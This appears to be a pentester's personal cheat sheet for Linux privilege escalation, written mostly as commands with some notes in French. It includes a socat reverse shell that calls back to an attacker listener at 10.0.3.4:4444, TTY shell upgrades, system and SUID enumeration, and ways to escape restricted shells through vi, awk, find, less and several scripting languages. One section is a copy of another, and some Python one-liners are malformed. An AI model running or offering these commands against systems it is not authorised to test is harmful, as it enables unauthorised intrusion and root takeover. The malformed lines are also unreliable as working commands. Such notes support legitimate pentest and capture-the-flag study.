# Privilege elevation


# Upgrate to TTY shell
## Python
````
?? python
which python
locate python
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'  
python -c 'import pty; pty.spawn("/bin/bash")'  
````

## socat

On Kali (listen):
  socat file:`tty`,raw,echo=0 tcp-listen:4444  
On Victim (launch):
  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  

If socat isn't installed, you're not out of luck. There are standalone binaries that can be downloaded from this awesome Github repo:
https://github.com/andrew-d/static-binaries

## Python + full options
Using stty options

````
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
````



# Operating System, kernel version, or service pack info
````
cat /etc/issue
cat /etc/*release
cat /proc/version
ls /boot | grep "vmlinuz"
lsb_release -a
uname -a
````
```
$ cat /etc/issue
Ubuntu 16.04.2 LTS \n \l

takis@tenten:~$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
NAME="Ubuntu"
VERSION="16.04.2 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.2 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial

takis@tenten:~$ cat /proc/version
Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017
takis@tenten:~$ ls /boot | grep "vmlinuz"
vmlinuz-4.4.0-62-generic
takis@tenten:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.2 LTS
Release:	16.04
Codename:	xenial

takis@tenten:~$ uname -a
Linux tenten 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```


# Find user information
````
id
whoami
last
````
 
# Check installed programs, permissions, and hidden files
````
ls -lah
ls -lah /usr/bin
ls -lah /sbin
yum list installed
dpkg-query -l
rpm -qa
ls -lah /usr/share/applications | awk -F '.desktop' ' { print $1}'
````
 
# Manual escalation commands
````
sudo su
sudo -i
sudo /bin/bash
sudo su-
sudo ht
pkexec visudo
/etc/passwd
/etc/sudoers
find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
find / -perm -4000 2>/dev/null | xargs ls -al
````

# Evaluate running services
````
ps aux
ps aux -u root
systemctl status (service)
top
pstree
cat /etc/services
service --status-all
````

 
# Check for scheduled tasks/jobs
````
cat /etc/cron.d/*
cat /var/spool/cron/*
crontab -l
cat /etc/crontab
cat /etc/cron.(time)
systemctl list-timers
````


# Spawn and Upgrade shells to tty
````
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/sh')
echo os.system('/bin/bash')
python -c "exit_code = os.system('/bin/sh') output = os.open('/bin/sh').read()"
````

# Escaping restricted shells
https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells

https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells



# Use binary with command execution
## scp -S
    scp -S /home/untrusted/script.sh x y:

## vi/vim
    ESC
    :set shell=/bin/bash
    :shell

    :! /bin/bash

## lynx & vi
    open a local file with lynx (e.g.: $ lynx /etc/passwd)
    type “o” to open the options; change the second option (Editor) to “/bin/vi” and save the changes to go back at the main page.
    Type “e” to edit the file with vi
    Follow instructions for vi

## mail client
    open a local file with lynx (e.g.: $ lynx /etc/passwd)
    type “o” to open the options; change the second option (Editor) to “/bin/vi” and save the changes to go back at the main page.
    Type “e” to edit the file with vi
    Follow instructions for vi

## elinks : web browser
    $ set EDITOR=/bin/vi
    Open a webpage containing a text box (should be easy to find on the Internet. If you can not, well lmgtfy!!!).
    Navigate to the text-box area and Enter to edit, the press F4 (or whatever is used in the configurations) to edit the text box externally, and you should see something familiar :=)

## Using IFS (à tester)
    On lance un programme qui execute /bin/mail
    On créé les fichier bin et mail en 777 dans le répertoire courant
    export IFS="/"
    
## awk
    awk 'BEGIN {system("/bin/sh")}'

## find
    find / -name blahblah -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

## More, Less, and Man Commands
!commandxxx
'! /bin/sh'
'!/bin/sh'
'!bash'

## Filtered characters : use tee 

If you do not have access to an editor, and would like to create a script, you can make use of the 'tee' command. 
Since you cannot make use of '>' or '>>', the 'tee' command can help you direct your output when used in tandem with the 'echo' command. 

echo "evil script code" | tee script.sh
tee -a 'xx' : append to file

## Langages
    python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
    perl -e 'exec "/bin/sh";'
    perl: exec "/bin/sh";
    ruby: exec "/bin/sh"
    lua: os.execute('/bin/sh')
    irb(main:001:0> exec "/bin/sh"

## Files Executed in Unrestricted Mode?


## Put in /opt/priv_esc_ux
- LinEnum.sh           : https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
- linuxprivchecker.py
- unixprivesc.sh

Upgrate Python3 : 2to3-3.5
Some restricted shells will start by running some files in an unrestricted mode before the restricted shell is applied. If your .bash_profile is executed in an unrestricted mode and it's editable, you'll be able to execute code and commands as an unrestricted user.